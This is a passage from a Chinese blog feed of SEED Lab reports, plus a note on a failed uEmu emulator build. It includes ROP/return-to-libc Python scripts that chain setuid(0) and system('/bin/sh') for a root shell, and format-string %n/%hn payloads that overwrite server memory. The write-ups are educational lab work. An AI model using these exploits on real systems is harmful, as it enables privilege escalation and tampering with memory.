f.write(content)</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功获取root权限shell</p>
<img src="/posts/53f1e8f/%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90.png" class="" title="获取权限"></li>
</ol>
<h3 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h3><ol>
<li><p>ROP攻击实验一（无参数串接函数）</p>
<p>无参数ROP传递链构造比较简单，因为正常情况下在正常执行函数后esp指针自动指向下一帧，所以只需将bar函数的地址按序填入返回地址10次即可。</p>
<p>构造脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line">bar_addr = <span class="number">0x565562d0</span>    <span class="comment"># The address of foo()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># foo*10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  content += (bar_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += (exit_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<img src="/posts/53f1e8f/ROP_1_results.png" class="" title="ROP_1_results">
</li>
<li><p>ROP攻击实验二（存在参数）</p>
<p>思路：通过跳过前序操作来实现，每一次调用函数都会跳过其对ebp操作两个指令，从而ebp无法压栈，因此可以直接填入参数，函数执行完毕后ebp可以跳转到下一个函数位置（跳过前序操作），继续执行。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">baz_skip_addr = <span class="number">0x56556315</span> + <span class="number">7</span>    <span class="comment"># The address of baz(skip)</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span>  <span class="comment"># foo()&#x27;s frame pointer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(baz_skip_addr)</span><br><span class="line">  content += tobytes(<span class="number">0xAABBCCDD</span>)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>-<span class="number">3</span>*<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>) <span class="comment"># The value is not important.</span></span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line">content += tobytes(<span class="number">0xEEBBCCDD</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功执行baz函数</p>
<img src="/posts/53f1e8f/ROP_2_results.png" class="" title="ROP_2_results">
</li>
<li><p>ROP攻击实验二（串接libc函数）</p>
<p>思路：通过跳过前序对ebp的操作来串接多个需要参数的libc函数。</p>
<p>构造脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0xf7e20de0</span>    <span class="comment"># The address of printf()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">leaveret = <span class="number">0x565562ce</span></span><br><span class="line">bash_addr = <span class="number">0xffffd3dc</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo + <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)  <span class="comment"># Next ebp value</span></span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">4</span>)  <span class="comment"># Fill up the frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(printf_addr)</span><br><span class="line">  content += tobytes(leaveret)</span><br><span class="line">  content += tobytes(bash_addr)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功打印出MYSHELL环境变量值</p>
<img src="/posts/53f1e8f/ROP_3_results.png" class="" title="ROP_3_results">
</li>
<li><p>ROP攻击实验三（参数存在0）</p>
<p>可以通过调用sprintf函数传递setuid的参数0，然后使用setuid(0)时real user ID &#x3D; effective user ID &#x3D; 0，从而使得bash&#x2F;dash在判断real user ID和effecive user ID时发现两者一致，从而使保护失效。然后调用system(‘&#x2F;bin&#x2F;sh’)获取root权限的shell，最终调用exit函数防止程序无法正常退出。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0xf7e20de0</span>    <span class="comment"># The address of printf()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">leaveret = <span class="number">0x565562ce</span></span><br><span class="line">bash_addr = <span class="number">0xffffd3de</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span></span><br><span class="line">sprintf_addr = <span class="number">0xf7e20e40</span></span><br><span class="line">setuid_addr = <span class="number">0xf7e99e30</span></span><br><span class="line">system_addr = <span class="number">0xf7e12420</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate the address of setuid()&#x27;s 1st argument</span></span><br><span class="line">sprintf_arg1 = ebp_foo + <span class="number">12</span> + <span class="number">5</span>*<span class="number">0x20</span></span><br><span class="line"><span class="comment"># The address of a byte that contains 0x00</span></span><br><span class="line">sprintf_arg2 = bash_addr + <span class="built_in">len</span>(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo + <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)  <span class="comment"># Next ebp value</span></span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">4</span>)  <span class="comment"># Fill up the frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sprintf(sprintf_arg1, sprintf_arg2)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(sprintf_addr)</span><br><span class="line">  content += tobytes(leaveret)</span><br><span class="line">  content += tobytes(sprintf_arg1)</span><br><span class="line">  content += tobytes(sprintf_arg2)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">5</span>*<span class="number">4</span>)</span><br><span class="line">  sprintf_arg1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setuid(0)</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(setuid_addr)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>-<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/bash&quot;)</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(system_addr)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += tobytes(bash_addr)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0x20</span> - <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果如下，成功获取到root权限下的shell</p>
<img src="/posts/53f1e8f/ROP_4_results.png" class="" title="ROP_4_results"></li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>Return</tag>
        <tag>to</tag>
        <tag>Libc</tag>
        <tag>SEED</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>uEmu复现</title>
    <url>/posts/8c8037e9.html</url>
    <content><![CDATA[<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 20.04（最好分配大于20G存储空间，否则可能不够用）</p>
<p>gitee链接：<a href="https://gitee.com/cpdt/uEmu.git">https://gitee.com/cpdt/uEmu.git</a></p>
<p>virtualbox</p>
<h2 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2. 步骤"></a>2. 步骤</h2><ol>
<li><p>克隆下载uEmu</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/cpdt/uEmu.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用vagrant Installation方式复现（不推荐，感觉和直接源码安装没区别，还要多出安装虚拟机的步骤，虚拟机套虚拟机。。。还容易崩溃。。。），安装virtualbox</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install vagrant</span><br><span class="line">sudo apt install virtualbox</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动虚拟机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vagrant up</span><br></pre></td></tr></table></figure>

<p>需要等几分钟，第一次会下载ubuntu镜像，这里放一个清华源镜像，添加到vagrantfile里：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config.vm.box_url = &#x27;https://mirrors.tuna.tsinghua.edu.cn/ubuntu-cloud-images/focal/20231207/focal-server-cloudimg-amd64-vagrant.box&#x27;</span><br></pre></td></tr></table></figure>

<p>再次vagrant up。没有报错，正常界面如下</p>
<img src="/posts/8c8037e9/image-20231219094453267.png" class="" title="image-20231219094453267">

<p>再输入命令登入即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vagrant ssh</span><br></pre></td></tr></table></figure>

<p>接下来进行源码编译安装，其中git-repo建议用清华源下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export uEmuDIR=/home/user/uEmu </span><br><span class="line">sudo apt-get install git-repo   </span><br><span class="line">cd $uEmuDIR</span><br><span class="line">repo init -u https://github.com/MCUSec/manifest.git -b uEmu</span><br><span class="line">repo sync</span><br></pre></td></tr></table></figure>

<p>其中<code>  init -u https://github.com/MCUSec/manifest.git -b uEmu</code>语句可能会报错，需要将python改为python3.</p>
<img src="/posts/8c8037e9/image-20231219095415829-17029508568891.png" class="" title="image-20231219095415829">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm /usr/bin/python</span><br><span class="line">sudo ln -s /usr/bin/python3 /usr/bin/python </span><br></pre></td></tr></table></figure>

<p>接下来编译uEmu，官方给的创建文件夹命令是sudo，但是会导致make时权限不足，所以不需要加sudo，编译耗时大概在1小时左右。。。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> <span class="variable">$uEmuDIR</span>/build</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> <span class="variable">$uEmuDIR</span>/build</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make -f <span class="variable">$uEmuDIR</span>/Makefile &amp;&amp; make -f <span class="variable">$uEmuDIR</span>/Makefile install</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Go make some coffee or <span class="keyword">do</span> whatever you want, this will take some time (approx. 60 mins on a 4-core machine)</span></span><br></pre></td></tr></table></figure>

<p>在make阶段解压tar文件时会出现虚拟机崩溃的现象，尝试增大内存以及处理器数量，成功解决。（建议设置大一点，否则后面也有可能卡死），另外发现虚拟机内编译时用的包是ubuntu18.04版本的，所以想要直接源码安装的可以考虑使用ubuntu18.04虚拟机。</p>
<img src="/posts/8c8037e9/image-20231219101217730-17029523713913.png" class="" title="image-20231219101217730">

<p>中间报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import distro ModuleNotFoundError: No module named &#x27;distro&#x27;&quot;.  Stop.</span><br><span class="line">apt install python3-distro</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/vagrant/uEmu/build/opt/bin/clang: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装ncurses库</span></span><br><span class="line">sudo apt-get install libncurses5</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/vagrant/uEmu/build/llvm-10.0.0.src/tools/gold/gold-plugin.cpp:34:10: fatal error: &#x27;plugin-api.h&#x27; file not found</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install binutils-dev</span><br></pre></td></tr></table></figure>

<p>找不到libelf&#x2F;libelf.h</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装库</span></span><br><span class="line">sudo apt-get install libelf-dev</span><br></pre></td></tr></table></figure>



<p>找不到glib.h<br>找到报错文件目录下CMakeList.txt添加glib-2.0的目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">include_directories($</span><span class="language-bash">&#123;catkin_INCLUDE_DIRS&#125;</span></span><br><span class="line"> /usr/lib/aarch64-linux-gnu/glib-2.0/include</span><br><span class="line"> /usr/include/glib-2.0</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>configure文件Permission Denied</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改文件权限即可</span></span><br><span class="line">chmod +x ./configure</span><br></pre></td></tr></table></figure>

<p>&#x2F;usr&#x2F;include&#x2F;gtk-2.0&#x2F;gtk&#x2F;gtktypeutils.h:236:1: error: ‘GTypeDebugFlags’ is deprecated [-Werror&#x3D;deprecated-declarations]</p>
<p>应该是版本不对应，不知道怎么改，废了。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>【SeedLab】格式化字符串实验报告</title>
    <url>/posts/5a0832a9.html</url>
    <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1 Overview"></a>1 Overview</h2><p><code>printf</code>函数用于根据指定格式打印出字符串，第一个参数诶格式化字符串<code>format string</code>，格式化字符串中使用了<code>%</code>来作为占位符。如果不使用<code>%</code>占位符而是直接将变量放入格式化字符串，则存在格式化字符串漏洞，可能被恶意利用。</p>
<h2 id="2-Environment-Setup"><a href="#2-Environment-Setup" class="headerlink" title="2 Environment Setup"></a>2 Environment Setup</h2><h3 id="2-1-Turning-of-Countermeasure"><a href="#2-1-Turning-of-Countermeasure" class="headerlink" title="2.1 Turning of Countermeasure"></a>2.1 Turning of Countermeasure</h3><p>关闭ASLR</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">kernel.randomize_va_space = 0</span><br></pre></td></tr></table></figure>

<h3 id="2-2-The-Vulnerable-Program"><a href="#2-2-The-Vulnerable-Program" class="headerlink" title="2.2 The Vulnerable Program"></a>2.2 The Vulnerable Program</h3><p>漏洞程序如下</p>
<p><code>format.c</code>：<code>myprintf</code>存在漏洞<code>printf(msg)</code>;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the rbp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq %%rbp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the ebp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(msg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Compilation</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cd server-code</span><br><span class="line">❯ make</span><br><span class="line">gcc -o server server.c</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -static -m32 -o format-32 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -o format-64 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">❯ make install</span><br><span class="line">cp server ../fmt-containers</span><br><span class="line">cp format-* ../fmt-containers</span><br></pre></td></tr></table></figure>

<p>可以看到编译中gcc会警告存在格式化字符串漏洞</p>
<h3 id="2-3-Container-Setup-and-Commands"><a href="#2-3-Container-Setup-and-Commands" class="headerlink" title="2.3 Container Setup and Commands"></a>2.3 Container Setup and Commands</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dcbuild</span><br><span class="line">dcup</span><br></pre></td></tr></table></figure>

<h2 id="3-Task-1-Crashing-the-Program"><a href="#3-Task-1-Crashing-the-Program" class="headerlink" title="3 Task 1: Crashing the Program"></a>3 Task 1: Crashing the Program</h2><p>首先尝试向10.9.0.5发送hello消息</p>
<img src="/posts/5a0832a9/image-20231211150919446.png" class="" title="image-20231211150919446">

<p>server端结果</p>
<img src="/posts/5a0832a9/image-20231211150812716.png" class="" title="image-20231211150812716">

<p>服务器最多接受1500字节的数据，在此任务中，需要构造payload让程序崩溃（服务器不会崩溃，因为format程序是server的子进程）</p>
<p>构造payload：<code>%s</code>，发现服务器端没有输出，程序成功crash</p>
<img src="/posts/5a0832a9/image-20231211151346427.png" class="" title="image-20231211151346427">

<img src="/posts/5a0832a9/image-20231211151405655.png" class="" title="image-20231211151405655">

<h2 id="4-Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#4-Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="4 Task 2: Printing Out the Server Program’s Memory"></a>4 Task 2: Printing Out the Server Program’s Memory</h2><p>继续使用10.9.0.5，令服务器打印出内存中数据</p>
<h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h3><p>打印栈上数据，需要知道需要多少个<code>%.8x</code>占位符，才能使服务器程序打印出输入的前四个字节。</p>
<p>构造python脚本，设定前四个字节为<code>0xffffffff</code>，构造100个<code>%.8x.</code>，令服务器端打印100个地址，查看前四个字节的位置。</p>
<img src="/posts/5a0832a9/image-20231211152629169.png" class="" title="image-20231211152629169">

<p>可以看到，<code>0xffffffff</code>位于第64个<code>%.8x.</code>处。</p>
<h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h3><p>堆上存储着一个秘密值，可以通过服务器端输出查找到，目标为打印出secret秘密值</p>
<p>由服务器端输出可以知道secret的地址为<code>0x080b4008</code>，因此将buffer的前四个字节设置为secret的地址，通过<code>%s</code>令服务器输出该地址的值。</p>
<p>构造python脚本如下:</p>
<img src="/posts/5a0832a9/image-20231211153657826.png" class="" title="image-20231211153657826">

<p>结果如上图，成功输出<code>A secret message</code>字符串</p>
<h2 id="5-Task-3-Modifying-the-Server-Program’s-Memory"><a href="#5-Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="5 Task 3: Modifying the Server Program’s Memory"></a>5 Task 3: Modifying the Server Program’s Memory</h2><p>继续使用10.9.0.5，目标为修改0x11223344地址的值。</p>
<h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><p>更改值即可，由服务器端输出可知<code>target</code>地址为<code>0x080e5068</code>，可以通过<code>%n</code>修改地址的值，构造payload。</p>
<p>payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">63</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出如下图，可见<code>target</code>成功被修改为了前面输出字符的个数(4+4+63*9)&#x3D;575&#x3D;0x23f</p>
<img src="/posts/5a0832a9/image-20231211154137419.png" class="" title="image-20231211154137419">

<h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h3><p>0x5000-0x23f &#x3D;  19905 因此需要增加19905个字符。</p>
<p>构造<code>payload</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.19914x&quot;</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>

<p>成功修改值为0x5000</p>
<img src="/posts/5a0832a9/image-20231211160234002.png" class="" title="image-20231211160234002">

<h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><p>值比较大，因此如果使用<code>%n</code>会导致输出时间过长，甚至可能卡死，因此需要使用<code>%hn</code>或<code>%hhn</code>一次只修改两个或一个字节。</p>
<p>如果使用<code>%hn</code>构造payload，一次只修改两字节，则需要先修改值较小的地址，然后才能修改值较高的地址。</p>
<p>构造前八个字节分别对应<code>0xAABB</code>和<code>0xCCDD</code>的地址，并且构造payload对两个地址的值分别进行修改：<code>0xaabb - 0x23f + 9 - 4 = 43137</code>， <code>0xccdd - 0xaabb = 8738</code></p>
